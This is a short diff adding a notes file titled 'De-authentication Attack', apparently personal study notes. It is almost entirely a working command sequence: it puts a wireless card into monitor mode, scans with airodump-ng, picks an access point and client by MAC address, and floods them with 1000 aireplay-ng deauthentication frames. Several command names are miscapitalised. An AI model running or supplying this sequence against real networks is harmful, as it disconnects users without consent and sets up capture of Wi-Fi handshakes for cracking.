@@ -1,0 +1,9 @@
+De-authentication Attack
+
+	Ifconfig wlan0 down
+	Iwconfig wlan0 mode monitor
+	Ifconfig wlan0 up
+	Iwconfig wlan0
+	Airodump-ng wlan0 ;scans kill by ctrl+c
+	airodump-ng --channel 1 --bssid 00:71:C2:9D:80:D0 wlan0 ;see clients on access point
+	aireplay-ng --deauth 1000 -a 00:71:C2:9D:80:D0 -c A4:5E:60:DB:AF:53 wlan0 ;pick the client
